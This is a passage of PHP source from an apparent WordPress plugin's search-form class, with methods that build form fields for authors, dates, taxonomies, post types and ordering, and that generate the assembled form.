		$authors = $wpdb->get_results("SELECT ID, display_name from {$wpdb->users} ORDER BY display_name LIMIT 100");

		$ph['options'] = '<option value="">'.__('All Authors', CCTM_TXTDOMAIN).'</option>';
		foreach ($authors as $a) {
			$ph['is_selected'] = ''; // reset
			$ph['value'] = $a->display_name;
			$ph['label'] = $a->display_name .'('.$a->ID.')';
			if ($current_value == $a->display_name) {
				$ph['is_selected'] = ' selected="selected"';
			}
			$ph['options'] .=  CCTM::parse($this->option_tpl, $ph, true);
		}

		$ph['value'] = '';
		$ph['name'] = 'author';
		$ph['id']  = 'author';
		$ph['label'] = __('Author', CCTM_TXTDOMAIN);
		$ph['description'] = __('Select an author whose posts you want to see.', CCTM_TXTDOMAIN);
		//  $ph['size'] = 5;
		$this->register_global_placeholders($ph, 'author');
		return CCTM::parse($this->select_wrapper_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * date_column: some js help, but the user can write in their own value for dates stored in custom fields (i.e. custom columns)
	 * post_date, post_date_gmt, post_modified, post_modified_gmt
	 *
	 * @return string
	 */
	private function _date_column() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = $this->get_value('date_column', 'post_modified');
		$ph['name'] = 'date_column';
		$ph['id']  = 'date_column';
		$ph['label'] = __('Date Columns', CCTM_TXTDOMAIN);
		$ph['description'] = __('Which column should be used for date comparisons? Select one, or write in a custom field.', CCTM_TXTDOMAIN);
		$ph['javascript_options'] = '
			<div class="js_button_wrapper">
				<span class="js_button" onclick="jQuery(\'#'.$this->placeholders['id_prefix'].'date_column\').val(\'post_date\');">post_date</span><br/>
				<span class="js_button" onclick="jQuery(\'#'.$this->placeholders['id_prefix'].'date_column\').val(\'post_date_gmt\');">post_date_gmt</span><br/>
				<span class="js_button" onclick="jQuery(\'#'.$this->placeholders['id_prefix'].'date_column\').val(\'post_modified\');">post_modified</span><br/>
				<span class="js_button" onclick="jQuery(\'#'.$this->placeholders['id_prefix'].'date_column\').val(\'post_modified_gmt\');">post_modified_gmt</span><br/>
			</div>';
		$this->register_global_placeholders($ph, 'date_column');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * Date format: some js help, but the user can write in their own value.
	 *
	 * @return string
	 */
	private function _date_format() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = $this->get_value('date_format', 'yyyy-mm-dd');
		$ph['name'] = 'date_format';
		$ph['id']  = 'date_format';
		$ph['label'] = __('Date Format', CCTM_TXTDOMAIN);
		$ph['description'] = __('How do you want the dates in the results formatted? Use one of the shortcuts, or supply a use any value valid for the <a href="http://php.net/manual/en/function.date-format.php">date_format()</a>', CCTM_TXTDOMAIN);

		$ph['javascript_options'] = '
			<span class="button" onclick="jQuery(\'#'.$this->placeholders['id_prefix'].'date_format\').val(\'mm/dd/yy\');">mm/dd/yy</span>
			<span class="button" onclick="jQuery(\'#'.$this->placeholders['id_prefix'].'date_format\').val(\'yyyy-mm-dd\');">yyyy-mm-dd</span>
			<span class="button" onclick="jQuery(\'#'.$this->placeholders['id_prefix'].'date_format\').val(\'yy-mm-dd\');">yy-mm-dd</span>
			<span class="button" onclick="jQuery(\'#'.$this->placeholders['id_prefix'].'date_format\').val(\'d M, y\');">d M, y</span>
			<span class="button" onclick="jQuery(\'#'.$this->placeholders['id_prefix'].'date_format\').val(\'d MM, y\');">d MM, y</span>
			<span class="button" onclick="jQuery(\'#'.$this->placeholders['id_prefix'].'date_format\').val(\'DD, d MM, yy\');">DD, d MM, yy</span>';
		$this->register_global_placeholders($ph, 'date_format');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * date_max
	 *
	 * @return string
	 */
	private function _date_max() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = $this->get_value('date_max');
		$ph['name'] = 'date_max';
		$ph['id']  = 'date_max';
		$ph['label'] = __('Date Maximum', CCTM_TXTDOMAIN);
		$ph['description'] = __('Only results from this date or before will be returned', CCTM_TXTDOMAIN);

		$ph['javascript_options'] = '
	    	<script>
				jQuery(function() {
					jQuery("#'.$this->placeholders['id_prefix'].'date_max").datepicker({
						dateFormat : "yy-mm-dd"
					});
				});
			</script>';
		$this->register_global_placeholders($ph, 'date_max');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * date_min
	 *
	 * @return string
	 */
	private function _date_min() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = $this->get_value('date_min');
		$ph['name'] = 'date_min';
		$ph['id']  = 'date_min';
		$ph['label'] = __('Date Minimum', CCTM_TXTDOMAIN);
		$ph['description'] = __('Only results from this date or after will be returned.', CCTM_TXTDOMAIN);

		$ph['javascript_options'] = '
	    	<script>
				jQuery(function() {
					jQuery("#'.$this->placeholders['id_prefix'].'date_min").datepicker({
						dateFormat : "yy-mm-dd"
					});
				});
			</script>';
		$this->register_global_placeholders($ph, 'date_min');
		return CCTM::parse($this->text_tpl, $ph, true);

	}


	//------------------------------------------------------------------------------
	/**
	 * Lists which posts to exclude
	 *
	 * @return string
	 */
	private function _exclude() {
		//$ph = $this->placeholders;
		$ph = array();
		$exclude = (array) $this->get_value('exclude');
		$ph['value'] = implode(',',$exclude);
		$ph['name'] = 'exclude';
		$ph['id']  = 'exclude';
		$ph['label'] = __('Exclude', CCTM_TXTDOMAIN);
		$ph['description'] = __('List posts by their ID that you wish to exclude from search results. Comma-separate multiple values.', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'exclude');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * List which posts to include
	 *
	 * @return string
	 */
	private function _include() {
		//$ph = $this->placeholders;
		$ph = array();

		$include = (array) $this->get_value('include');
		$ph['value'] = implode(',',$include);
		$ph['name'] = 'include';
		$ph['id']  = 'include';
		$ph['label'] = __('Include', CCTM_TXTDOMAIN);
		$ph['description'] = __('List posts by their ID that you wish to return.  Usually this option is not used with any other search options. Comma-separate multiple values.', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'include');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * Limits the number of posts returned OR sets the number of posts per page
	 * if pagination is on.
	 *
	 * @return string
	 */
	private function _limit() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = (int) $this->get_value('limit');
		$ph['name'] = 'limit';
		$ph['id']  = 'limit';
		$ph['label'] = __('Limit', CCTM_TXTDOMAIN);
		$ph['description'] = __('Limit the number of results returned. If pagination is enabled, this number will be the number of results shown per page.', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'limit');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * match_rule
	 *
	 * @return string
	 */
	private function _match_rule() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = $this->get_value('match_rule');
		$ph['name'] = 'match_rule';
		$ph['id']  = 'match_rule';
		$ph['label'] = __('Match Rule', CCTM_TXTDOMAIN);
		$ph['description'] = __('Define how your search term should match.', CCTM_TXTDOMAIN);
		$ph['size'] = 1;

		$match_rules = array(
			'contains'   => __('Contains', CCTM_TXTDOMAIN),
			'starts_with'  => __('Starts with', CCTM_TXTDOMAIN),
			'ends_with'  => __('Ends with', CCTM_TXTDOMAIN),
		);
		$ph['options'] = '';
		foreach ($match_rules as $value => $label) {
			$ph2['value'] = $value;
			$ph2['label'] = $label;
			$ph['options'] .=  CCTM::parse($this->option_tpl, $ph2, true);
		}
		$this->register_global_placeholders($ph, 'match_rule');
		return CCTM::parse($this->select_wrapper_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * Meta key is the name of a custom field from wp_postmeta: should be used with meta_value
	 *
	 * @return string
	 */
	private function _meta_key() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = htmlspecialchars($this->get_value('meta_key'));
		$ph['name'] = 'meta_key';
		$ph['id']  = 'meta_key';
		$ph['label'] = __('Meta Key', CCTM_TXTDOMAIN);
		$ph['description'] = __('Name of a custom field, to be used in conjuncture with <em>meta_value</em>.', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'meta_key');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * Meta key is the name of a custom field from wp_postmeta: should be used with meta_value
	 *
	 * @return string
	 */
	private function _meta_value() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = htmlspecialchars($this->get_value('meta_value'));
		$ph['name'] = 'meta_value';
		$ph['id']  = 'meta_value';
		$ph['label'] = __('Meta Value', CCTM_TXTDOMAIN);
		$ph['description'] = __('Value of a custom field, to be used in conjuncture with <em>meta_key</em>.', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'meta_value');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * Offset
	 *
	 * @return string
	 */
	private function _offset() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = (int) $this->get_value('offset');
		$ph['name'] = 'offset';
		$ph['id']  = 'offset';
		$ph['label'] = __('Offset', CCTM_TXTDOMAIN);
		$ph['description'] = __('Number of results to skip.  Usually this is used only programmatically when pagination is enabled.', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'offset');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * Lets the user select a valid post_type
	 *
	 * @return string
	 */
	private function _omit_post_type() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['label'] = __('Omit Post Types', CCTM_TXTDOMAIN);
		$ph['id']  = 'omit_post_type';
		$omit_post_type = (array) $this->get_value('omit_post_type');
		$ph['value'] = implode(',', $omit_post_type);
		$ph['name'] = 'omit_post_type[]';
		$ph['description'] = __('Check which post-types you wish to omit from search results.', CCTM_TXTDOMAIN);

		$i = 0;
		$ph['checkboxes'] = '';
		$post_types = get_post_types();
		foreach ($post_types as $k => $pt) {
			$ph2 = $this->placeholders;
			$ph2['value'] = $k;
			$ph2['name'] = 'omit_post_type[]';
			$ph2['label'] = $pt;
			$ph2['input_class'] = 'input_checkbox';
			$ph2['label_class'] = 'label_checkbox';
			$ph2['id'] = 'omit_post_type' . $i;
			$ph['checkboxes'] .= CCTM::parse($this->checkbox_tpl, $ph2, true);
			$i++;
		}
		$this->register_global_placeholders($ph, 'omit_post_type');
		return CCTM::parse($this->checkbox_wrapper_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * Order of results: ascending, descending
	 *
	 * @return string
	 */
	private function _order() {

		//$ph = $this->placeholders;
		$ph = array();

		$current_value = $this->get_value('order');

		$ph['name'] = 'order';
		$ph['id']  = 'order';
		$ph['label'] = __('Order', CCTM_TXTDOMAIN);
		$ph['description'] = __('What order should search results be returned in? See also the <em>orderby</em> parameter.', CCTM_TXTDOMAIN);
		$ph['checkboxes'] = '';

		$ph2 = $this->placeholders;
		if ($current_value == 'ASC') {
			$ph2['is_checked'] = ' checked="checked"';
			$ph2['is_selected'] = ' selected="selected"';
			$this->placeholders['order.ASC.is_checked'] = ' checked="checked"';
			$this->placeholders['order.ASC.is_selected'] = ' selected="selected"';
		}
		$ph2['value'] = 'ASC';
		$ph2['label'] = __('Ascending', CCTM_TXTDOMAIN);
		$ph2['id'] = 'order_asc';
		$ph2['name'] = 'order';
		$ph2['input_class'] = 'input_radio';
		$ph2['label_class'] = 'label_radio';
		$ph['checkboxes'] .= CCTM::parse($this->radio_tpl, $ph2, true);

		$ph3 = $this->placeholders;
		if ($current_value == 'DESC') {
			$ph3['is_checked'] = ' checked="checked"';
			$ph3['is_selected'] = ' selected="selected"';
			$this->placeholders['order.DESC.is_checked'] = ' checked="checked"';
			$this->placeholders['order.DESC.is_selected'] = ' selected="selected"';
		}
		$ph3['value'] = 'DESC';
		$ph3['label'] = __('Descending', CCTM_TXTDOMAIN);
		$ph3['id'] = 'order_desc';
		$ph3['name'] = 'order';
		$ph3['input_class'] = 'input_radio';
		$ph3['label_class'] = 'label_radio';
		$ph['checkboxes'] .= CCTM::parse($this->radio_tpl, $ph3, true);

		$this->register_global_placeholders($ph, 'order');

		return CCTM::parse($this->checkbox_wrapper_tpl, $ph, true);

	}


	//------------------------------------------------------------------------------
	/**
	 *
	 *
	 * @return string
	 */
	private function _orderby() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = $this->get_value('orderby');
		$ph['name'] = 'orderby';
		$ph['id']  = 'orderby';
		$ph['label'] = __('Order By', CCTM_TXTDOMAIN);
		$ph['description'] = __('Which column should results be sorted by. This can be any column from the wp_posts table or any custom field. Default: ID', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'orderby');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * Enable pagination?
	 *
	 * @return string
	 */
	private function _paginate() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = $this->get_value('paginate');
		$ph['name'] = 'paginate';
		$ph['id']  = 'paginate';
		$ph['label'] = __('Paginate Results', CCTM_TXTDOMAIN);
		$ph['description'] = 'Check this to paginate long result sets.'; // __('.', CCTM_TXTDOMAIN);
		$ph['label_class'] = 'label_checkbox';
		$ph['checkboxes'] = CCTM::parse($this->checkbox_tpl, $ph, true);
		$this->register_global_placeholders($ph, 'paginate');
		$ph['label'] = __('Pagination', CCTM_TXTDOMAIN);
		$ph['label_class'] = 'input_title';
		return CCTM::parse($this->checkbox_wrapper_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * post_date
	 *
	 * @return string
	 */
	private function _post_date() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = $this->get_value('post_date');
		$ph['name'] = 'post_date';
		$ph['id']  = 'post_date';
		$ph['label'] = __('Post Date', CCTM_TXTDOMAIN);
		$ph['description'] = __('Find posts from this date.  Use the <em>date_column</em> parameter to determine which column should be considered.', CCTM_TXTDOMAIN);

		$ph['javascript_options'] = '
	    	<script>
				jQuery(function() {
					jQuery("#'.$this->placeholders['id_prefix'].'post_date").datepicker({
						dateFormat : "yy-mm-dd"
					});
				});
			</script>';
		$this->register_global_placeholders($ph, 'post_date');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * post_mime_type
	 *
	 * @return string
	 */
	private function _post_mime_type() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = $this->get_value('post_mime_type');
		$ph['name'] = 'post_mime_type';
		$ph['id']  = 'post_mime_type';
		$ph['label'] = __('Post MIME Type', CCTM_TXTDOMAIN);
		$ph['description'] = __('Specify either the full MIME type (e.g. image/jpeg) or just the beginning (e.g. application, image, audio, video).', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'post_mime_type');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * post_modified
	 *
	 * @return string
	 */
	private function _post_modified() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = $this->get_value('post_modified');
		$ph['name'] = 'post_modified';
		$ph['id']  = 'post_modified';
		$ph['label'] = __('Post Modified', CCTM_TXTDOMAIN);
		$ph['description'] = __('Find posts modified on this date.', CCTM_TXTDOMAIN);

		$ph['javascript_options'] = '
	    	<script>
				jQuery(function() {
					jQuery("#'.$this->placeholders['id_prefix'].'post_modified").datepicker({
						dateFormat : "yy-mm-dd"
					});
				});
			</script>';
		$this->register_global_placeholders($ph, 'post_modified');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * post_parent
	 *
	 * @return string
	 */
	private function _post_parent() {
		//$ph = $this->placeholders;
		$ph = array();

		$val = $this->get_value('post_parent');
		if (!empty($val) && is_array($val)) {
			$ph['value'] = implode(',', $val);
		}
		$ph['name'] = 'post_parent';
		$ph['id']  = 'post_parent';
		$ph['label'] = __('Post Parent', CCTM_TXTDOMAIN);
		$ph['description'] = __('Retrieve all posts that are children of the post ID(s) specified. Comma-separate multiple values.', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'post_parent');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * post_status
	 *
	 * @return string
	 */
	private function _post_status() {
		//$ph = $this->placeholders;
		$ph = array();

		$post_status = (array) $this->get_value('post_status', array());
		$ph['value'] = implode(',', $post_status);

		$ph['name'] = 'post_status';
		$ph['id']  = 'post_status';
		$ph['label'] = __('Post Status', CCTM_TXTDOMAIN);
		$ph['description'] = __('Most searches will be for published posts.', CCTM_TXTDOMAIN);

		$i = 0;
		$ph['checkboxes'] = '';
		$post_statuses = array('draft', 'inherit', 'publish', 'auto-draft','private','pending', 'future', 'trash');

		foreach ($post_statuses as $ps) {
			$ph2 = $this->placeholders;
			$ph2['name'] = 'post_status[]';
			$ph2['is_checked'] = '';
			if (in_array($ps, $post_status)) {
				$ph2['is_checked'] = ' checked="checked"';
			}
			$ph2['value'] = $ps;
			$ph2['label'] = $ps;
			$ph2['input_class'] = 'input_checkbox';
			$ph2['label_class'] = 'label_checkbox';
			$ph2['id'] = 'post_status' . $i;
			$ph['checkboxes'] .= CCTM::parse($this->checkbox_tpl, $ph2, true);
			$i++;
		}
		$this->register_global_placeholders($ph, 'post_status');
		return CCTM::parse($this->checkbox_wrapper_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * post_title
	 *
	 * @return string
	 */
	private function _post_title() {
		//$ph = $this->placeholders;
		$ph = array();
		$ph['value'] = htmlspecialchars($this->get_value('post_title'));
		$ph['name'] = 'post_title';
		$ph['id']  = 'post_title';
		$ph['label'] = __('Post Title', CCTM_TXTDOMAIN);
		$ph['description'] = __('Retrieve posts with this exact title.', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'post_title');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * Lets the user select a valid post_type
	 *
	 * @return string
	 */
	private function _post_type() {
		//  $ph = $this->placeholders;
		$ph = array();
		$current_value = (array) $this->get_value('post_type');

		$ph['label'] = __('Post Types', CCTM_TXTDOMAIN);
		$ph['id']  = 'post_type';
		$ph['value'] = implode(',', $current_value);
		$ph['name'] = 'post_type[]';
		$ph['description'] = __('Check which post-types you wish to search.', CCTM_TXTDOMAIN);

		$i = 0;
		$ph['checkboxes'] = '';
		$ph['options'] = '';
		// put a blank option before all the rest
		$ph2['name'] = 'post_type[]';
		$ph2['input_class'] = 'input_checkbox';
		$ph2['label_class'] = 'label_checkbox';
		$ph2['label'] = __('Select post-type', CCTM_TXTDOMAIN);
		//  $ph['checkboxes'] .= CCTM::parse($this->checkbox_tpl, $ph2);
		$ph['options'] .= CCTM::parse($this->option_tpl, $ph2, true);


		$post_types = '';
		if (isset($this->Q->defaults['post_type'])) {
			$post_types = $this->Q->defaults['post_type'];
		}
		if (empty($post_types)) {
			$post_types = get_post_types(array('public'=>true));
		}

		sort($post_types);
		foreach ($post_types as $pt) {
			$ph2 = $this->placeholders;
			$ph2['name'] = 'post_type[]';
			if (in_array($pt, $current_value)) {
				$ph2['is_selected'] = ' selected="selected"';
				$ph2['is_checked'] = ' checked="checked"';
				$this->placeholders['post_type.'.$pt.'.is_selected'] = ' selected="selected"';
				$this->placeholders['post_type.'.$pt.'.is_checked'] = ' checked="checked"';
			}
			$ph2['value'] = $pt;
			$ph2['label'] = $pt;
			$ph2['input_class'] = 'input_checkbox';
			$ph2['label_class'] = 'label_checkbox';
			$ph2['id'] = 'post_type' . $i;
			$ph['checkboxes'] .= CCTM::parse($this->checkbox_tpl, $ph2, true);
			$ph['options'] .= CCTM::parse($this->option_tpl, $ph2, true);
			$i++;
		}
		$this->register_global_placeholders($ph, 'post_type');
		return CCTM::parse($this->checkbox_wrapper_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * Which columns to search
	 *
	 * @return string
	 */
	private function _search_columns() {
		//$ph = $this->placeholders;
		$ph = array();

		$search_columns = (array) $this->get_value('search_columns');
		$ph['value'] = implode(',', $search_columns);
		$ph['name'] = 'search_columns';
		$ph['id']  = 'search_columns';
		$ph['label'] = __('Search Columns', CCTM_TXTDOMAIN);
		$ph['description'] = __('When searching by a <em>search_term</em>, which define columns should be searched. Comma-separate multiple values. You can specify custom-fields as column names.', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'search_columns');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * Generates simple search term box.
	 *
	 * @return string
	 */
	private function _search_term() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = htmlspecialchars($this->get_value('search_term'));
		$ph['name'] = 'search_term';
		$ph['id']  = 'search_term';
		$ph['label'] = __('Search Term', CCTM_TXTDOMAIN);
		$ph['description'] = __('Search posts for this term. Use the <em>search_columns</em> parameter to specify which columns are searched for the term.', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'search_term');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * taxonomy
	 *
	 * @return string
	 */
	private function _taxonomy() {
		//$ph = $this->placeholders;
		$ph = array();

		$current_value = $this->get_value('taxonomy');
		$ph['options'] = '';
		// put a blank option before all the rest
		$ph2['value'] = '';
		$ph2['name'] = 'taxonomy';
		$ph2['label'] = __('Select taxonomy', CCTM_TXTDOMAIN);
		$ph['options'] .= CCTM::parse($this->option_tpl, $ph2, true);

		$taxonomies = get_taxonomies();
		foreach ($taxonomies as $t) {
			$ph2 = $this->placeholders;
			$ph2['value'] = $t;
			$ph2['label'] = $t;
			if ($current_value == $t) {
				$ph2['is_selected'] = ' selected="selected"';
			}
			$ph['options'] .=  CCTM::parse($this->option_tpl, $ph2, true);
		}

		$ph['value'] = $current_value;
		$ph['name'] = 'taxonomy';
		$ph['id']  = 'taxonomy';
		$ph['label'] = __('Taxonomy', CCTM_TXTDOMAIN);
		$ph['description'] = __('Choose which taxonomy to search in. Used in conjunction with <em>taxonomy_term</em>.', CCTM_TXTDOMAIN);
		$ph['size'] = 1;
		$this->register_global_placeholders($ph, 'taxonomy');
		return CCTM::parse($this->select_wrapper_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * How deep to search the taxonomy
	 *
	 * @return string
	 */
	private function _taxonomy_depth() {
		//$ph = $this->placeholders;
		$ph = array();

		$ph['value'] = $this->get_value('taxonomy_depth');
		$ph['name'] = 'taxonomy_depth';
		$ph['id']  = 'taxonomy_depth';
		$ph['label'] = __('Taxonomy Depth', CCTM_TXTDOMAIN);
		$ph['description'] = __('When doing a hierarchical taxonomical search (e.g. by sub-categories), increase this number to reflect how many levels down the hierarchical tree should be searched. For example, 1 = return posts classified with the given taxonomical term (e.g. mammals), 2 = return posts classified with the given term or with the sub-taxonomies (e.g. mammals or dogs). (default: 1).', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'taxonomy_depth');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * taxonomy_slug
	 *
	 * @return string
	 */
	private function _taxonomy_slug() {
		//$ph = $this->placeholders;
		$ph = array();

		$current_value = $this->get_value('taxonomy_slug');
		if (is_array($current_value)) {
			$current_value = implode(',',$current_value);
		}
		$ph['value'] = $current_value;
		$ph['name'] = 'taxonomy_slug';
		$ph['id']  = 'taxonomy_slug';
		$ph['label'] = __('Taxonomy Slug', CCTM_TXTDOMAIN);
		$ph['description'] = __('The taxonomy slug is the URL-friendly taxonomy term.', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'taxonomy_slug');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * taxonomy_term
	 *
	 * @return string
	 */
	private function _taxonomy_term() {
		//$ph = $this->placeholders;
		$ph = array();

		// print '<pre>'.print_r($this->get_value('taxonomy_term'), true).'</pre>';
		$val = $this->get_value('taxonomy_term');
		if (!empty($val) && is_array($val)) {
			$ph['value'] = implode(',', $val);
		}
		$ph['name'] = 'taxonomy_term';
		$ph['id']  = 'taxonomy_term';
		$ph['label'] = __('Taxonomy Term', CCTM_TXTDOMAIN);
		$ph['description'] = __('Set a specific category(ies) or tag(s) to include in search results. Comma-separate multiple values.', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'taxonomy_term');
		return CCTM::parse($this->text_tpl, $ph, true);

	}


	//------------------------------------------------------------------------------
	/**
	 * yearmonth: uses the date-column
	 *
	 * @return string
	 */
	private function _yearmonth() {
		//$ph = $this->placeholders;
		$ph = array();

		$current_value = $this->get_value('yearmonth');

		$ph['options'] = '';
		global $wpdb;
		// if date_column is part of wp_posts: //!TODO
		$yearmonths = $wpdb->get_results("SELECT DISTINCT DATE_FORMAT(post_date,'%Y%m') as 'yearmonth'
			, DATE_FORMAT(post_date,'%M') as 'month'
			, YEAR(post_date) as 'year'
			FROM {$wpdb->posts}
			WHERE post_status = 'publish'
			ORDER BY yearmonth");
		foreach ($yearmonths as $ym) {
			$ph2 = $this->placeholders;
			$ph2['value'] = $ym->yearmonth;
			$ph2['label'] = $ym->year . ' ' . $ym->month;
			if ($current_value == $ym->yearmonth) {
				$ph2['is_selected'] = ' selected="selected"';
				$this->placeholders['yearmonth.'.$ym->yearmonth.'.is_selected'] = ' selected="selected"';
				$this->placeholders['yearmonth.'.$ym->yearmonth.'.is_checked'] = ' checked="checked"';
			}
			$ph['options'] .=  CCTM::parse($this->option_tpl, $ph2, true);
		}

		$ph['value'] = $current_value;
		$ph['name'] = 'yearmonth';
		$ph['id']  = 'yearmonth';
		$ph['label'] = __('Month', CCTM_TXTDOMAIN);
		$ph['description'] = __("Choose which month's posts you wish to view. This relies on the <em>date_column</em> parameter.", CCTM_TXTDOMAIN);
		$ph['size'] = 1;
		$this->register_global_placeholders($ph, 'yearmonth');
		return CCTM::parse($this->select_wrapper_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	//! Public Functions
	//------------------------------------------------------------------------------
	/**
	 * Format any errors in an unordered list, or returns a message saying there were no errors.
	 *
	 * @return string
	 */
	public function debug() {
		// debugging only really makes sense after you've run generate()
		if (empty($this->stop_time)) {
			$this->generate($this->search_by);
		}
		// in seconds
		$time = $this->stop_time - $this->start_time;
		//return print_r($this->values,true);

		if (!empty($this->errors)) {
			$output = '';
			$items = '';
			foreach ($this->errors as $id => $e) {
				$items .= '<li>'.$e.'</li>' ."\n";
			}
			$output = '<ul>'."\n".$items.'</ul>'."\n";
			return $output;
		}
		else {
			return __('There were no errors.');
		}
	}


	//------------------------------------------------------------------------------
	/**
	 * Generate a form.  This is the main event.
	 *
	 * @param array   (optional) $search_by specify which parameters you want to search by
	 * @param array   (optional) $existing_values to populate the form e.g. from $_POST.
	 * @return string HTML form.
	 */
	public function generate($search_by=array(), $existing_values=array()) {

		foreach ($existing_values as $k => $v) {
			$this->Q->$k = $v; // to __set() on GetPostsQuery
		}
		$this->values = $this->Q->args; // from GetPostsQuery

		static $instantiation_count = 0; // used to generate a unique CSS for every form on the page
		$instantiation_count++;
		$this->placeholders['form_number'] = $instantiation_count;

		// Default CSS stuff
		if (!isset($this->placeholders['css'])) {
			$dir = dirname(dirname(__FILE__));
			$this->set_css( $dir.'/css/searchform.css');
		}

		// Defaults
		if (!empty($search_by)) {
			// override
			$this->search_by = $search_by;
		}
		// Override to our EVERYTHING search.
		if ($search_by === true) {
			$this->search_by = $this->search_by_everything;
		}

		$output = '';
		$this->placeholders['content'] = '';
		// Each part of the form is generated by component functions that correspond
		// exactly to the $search_by arguments.
		foreach ($this->search_by as $p) {
			$function_name = '_'.$p;
			if (method_exists($this, $function_name)) {
				$this->placeholders[$p] = $this->$function_name();
				// Keep the main 'content' bit populated: the content is the sum total of all generated elements.
				$this->placeholders['content'] .= $this->placeholders[$p];
			}
			else {
				$this->placeholders[$p] = $this->__call($p,array());
				// Keep the main 'content' bit populated.
				$this->placeholders['content'] .= $this->placeholders[$p];
				$this->errors['invalid_searchby_parameter'] = sprintf( __('Possible invalid search_by parameter:'), "<em>$p</em>");
			}
		}

		// Get help
		// $all_placeholders = array_keys($this->placeholders);
		$all_placeholders = array();
		foreach ($this->placeholders as $key => $tmp) {
			$all_placeholders[$key] = "&#91;+$key+&#93;";
		}
		$this->placeholders['nonce'] = $this->get_nonce_field(); // this won't show via [+help+]
		$this->placeholders['help'] = implode(', ', $all_placeholders);

		// Two passes.
		$this->form_tpl = CCTM::parse($this->form_tpl, $this->placeholders, true);
		$out = CCTM::parse($this->form_tpl, $this->placeholders);
		$this->stop_time = microtime(true);
		return $out;
	}


	//------------------------------------------------------------------------------
	/**
	 * Retrieves the "No Results" message.
	 *
	 * @return string
	 */
	public function get_no_results_msg() {
		return $this->no_results_msg;
	}


	//------------------------------------------------------------------------------
	/**
	 * Retrieves a nonce field (set @ __construct or overriden via set_nonce)
	 *
	 * @return string
	 */
	public function get_nonce_field() {
		return $this->nonce_field;
	}


	//------------------------------------------------------------------------------
	/**
	 * Get a value -- these should be filtered via GetPostsQuery::sanitize_args()
	 *
	 * @param string  $key the key to search for in the $this->values array
	 * @param mixed   (optional) $default value to return if the value is not set.
	 * @return mixed
	 */
	public function get_value($key, $default='') {
		if ( !isset($this->values[$key]) ) {
			return $default;
		}
		else {
			return $this->values[$key];
		}
	}


	//------------------------------------------------------------------------------
	/**
	 * Ensure a valid date. 0000-00-00 qualifies as valid; if you need to ensure a REAL
	 * date (i.e. where '0000-00-00' is not allowed), then simply marking the field required
